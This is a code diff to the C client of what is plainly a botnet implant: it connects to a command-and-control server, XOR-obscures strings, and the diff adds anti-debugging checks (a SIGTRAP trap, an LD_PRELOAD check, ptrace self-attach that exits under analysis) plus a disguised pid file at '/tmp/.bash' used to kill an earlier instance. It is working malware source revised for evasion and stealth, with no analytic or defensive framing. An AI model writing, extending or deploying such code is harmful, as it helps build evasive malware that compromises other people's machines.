@@ -8,11 +8,11 @@
 #include <unistd.h>
 
 #include <sys/time.h>
+#include <sys/ptrace.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
 
 #include "xhdrs/includes.h"
-#include "xhdrs/killer.h"
 #include "xhdrs/net.h"
 #include "xhdrs/packet.h"
 //#include "xhdrs/sha256.h"
@@ -24,8 +24,10 @@ sig_atomic_t exiting = 0;
 
 uint32_t table_key = 0xdeadbeef; // util_strxor; For packets only?
 
-static volatile int sockfd = -1;
+static int sockfd = -1, num_traps = 0;
 static char uniq_id[32] = "";
+
+#define SPC_DEBUGGER_PRESENT (num_traps == 0)
 
 #ifdef DEBUG
 static void init_exit(void)
@@ -131,46 +133,82 @@ static void init_uniq_id(void)
     }
 }
 
+static void dbg_trap(int signo)
+{
+    num_traps++;
+}
+
+int spc_trap_detect(void)
+{
+    if(signal(SIGTRAP, dbg_trap) == SIG_ERR)
+        return 0;
+    
+    raise(SIGTRAP);
+    
+    return 1;
+}
+
+static void init_trap_detect(void)
+{
+	int i;
+	
+    spc_trap_detect();
+	for(i = 0; i < 10; i++)
+	{
+		if(SPC_DEBUGGER_PRESENT)
+			_exit(EXIT_FAILURE);
+	}
+	
+	if(getenv("LD_PRELOAD"))
+		_exit(EXIT_FAILURE);
+	
+	if(ptrace(PTRACE_TRACEME, 0, 0, 0) < 0)
+		_exit(EXIT_FAILURE);
+}
+
 static void ensure_single_instance(void)
 {
-	int sockfd = -1;
+	unsigned int pidc;
+    char *pidfile;
 	
-	if((sockfd = net_bind("127.0.0.1", SINGLE_INSTANCE_PORT, IPPROTO_UDP)) < 0)
-	{
-		if(errno == EADDRNOTAVAIL || errno == EADDRINUSE)
+    FILE *pidfd;
+    
+	pidfile = "/tmp/.bash";
+    
+    if(!access(pidfile, F_OK) && !access(pidfile, R_OK))
+    {
+        if((pidfd = fopen(pidfile, "r+")) != NULL)
 		{
 #ifdef DEBUG
-			util_msgc("Error", "Another instance is already running "
-				"(errno=%s)", strerror(errno));
-			util_msgc("Info", "Sending kill request: now");
+			util_msgc("Info", "Attempting to kill rouge process!");
 #endif
-			if((sockfd = net_connect("127.0.0.1", SINGLE_INSTANCE_PORT, IPPROTO_UDP)) < 0)
-			{
+            while(fscanf(pidfd, "%d", &pidc) == 2);
+            fclose(pidfd);
+            kill(pidc, SIGKILL);
+            remove(pidfile);
+        }
+    }
 #ifdef DEBUG
-				util_msgc("Error", "Failed to connect to SINGLE_INSTANCE_PORT"
-					" to request termination (errno=%s)", strerror(errno));
-#endif
-			}
-			
-			util_sleep(5);
-			close(sockfd);
-			killer_kill_by_port(SINGLE_INSTANCE_PORT);
-			ensure_single_instance();
-		}
-	}
 	else
 	{
-#ifdef DEBUG
-		util_msgc("Info", "We're the only instance on this system!");
-#endif
+		util_msgc("Info", "We're the only instance running!");
 	}
+#endif
+    
+    if((pidfd = fopen(pidfile, "a+")) != NULL)
+    {
+        fprintf(pidfd, "%d", getpid());
+        fclose(pidfd);
+    }
 }
 
 int main(int argc, char *argv[])
 {
 	ssize_t buflen;
 	char pktbuf[512];
-
+	
+	init_trap_detect();
+	
 #ifdef DEBUG
 	struct in_addr ip4;
 #endif
@@ -215,8 +253,12 @@ int main(int argc, char *argv[])
 		}
 		
 #ifdef DEBUG
-		ip4.s_addr = LOCAL_ADDR;
-		util_msgc("Info", "Connected to cnc, local_addr = %s", inet_ntoa(ip4));
+		if(!exiting)
+		{
+			ip4.s_addr = LOCAL_ADDR;
+			util_msgc("Info", "Connected to cnc, local_addr = %s", 
+				inet_ntoa(ip4));
+		}
 #endif
 		
 		while(!exiting)
